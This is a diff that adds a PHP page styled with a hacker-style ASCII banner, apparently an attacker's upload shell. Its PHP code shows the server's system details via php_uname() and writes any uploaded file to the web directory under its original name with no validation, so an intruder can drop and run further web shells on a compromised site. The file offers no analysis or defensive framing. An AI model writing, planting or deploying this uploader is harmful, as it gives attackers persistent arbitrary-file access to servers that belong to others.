@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Upload</title>
+    <style>
+        body {
+            background-color: black;
+            color: red;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        h2 {
+            font-size: 24px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: red;
+            color: white;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: darkred;
+        }
+        .ascii {
+            font-family: monospace;
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+        .result {
+            margin-top: 20px;
+        }
+        input[type="text"] {
+            padding: 5px;
+            font-size: 16px;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            width: 60%;
+        }
+        .copy-button {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="ascii">
+         █████╗ ███████╗███╗   ███╗ ██████╗ ██████╗ ███████╗██╗   ██╗███████╗     ██╗ █████╗  █████╗ ███████╗<br>
+        ██╔══██╗██╔════╝████╗ ████║██╔═══██╗██╔══██╗██╔════╝██║   ██║██╔════╝    ███║██╔══██╗██╔══██╗██╔════╝<br>
+        ███████║███████╗██╔████╔██║██║   ██║██║  ██║█████╗  ██║   ██║███████╗    ╚██║╚█████╔╝╚██████║███████╗<br>
+        ██╔══██║╚════██║██║╚██╔╝██║██║   ██║██║  ██║██╔══╝  ██║   ██║╚════██║     ██║██╔══██╗ ╚═══██║╚════██║<br>
+        ██║  ██║███████║██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗╚██████╔╝███████║     ██║╚█████╔╝ █████╔╝███████║<br>
+        ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝ ╚════╝  ╚════╝ ╚══════╝
+    </div>
+
+    <h2>File Upload</h2>
+
+    <form method="POST" enctype="multipart/form-data">
+        <input type="file" name="__"><br><br>
+        <input name="_" type="submit" value="Upload">
+    </form>
+
+    <div class="result">
+        <?php
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            if (isset($_FILES['__']) && $_FILES['__']['error'] == UPLOAD_ERR_OK) {
+                $tmp_name = $_FILES['__']['tmp_name'];
+                $name = $_FILES['__']['name'];
+
+                if (move_uploaded_file($tmp_name, $name)) {
+                    echo '<pre>' . php_uname() . "\n</pre><br/>File uploaded successfully.";
+                } else {
+                    echo 'Failed to upload file.';
+                }
+            } else {
+                echo 'No file uploaded or error during upload.';
+            }
+        } else {
+            echo '<pre>' . php_uname() . "\n</pre><br/><form method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"__\"><input name=\"_\" type=\"submit\" value=\"Upload\"></form>";
+        }
+        ?>
+    </div>
+
+</body>
+</html>
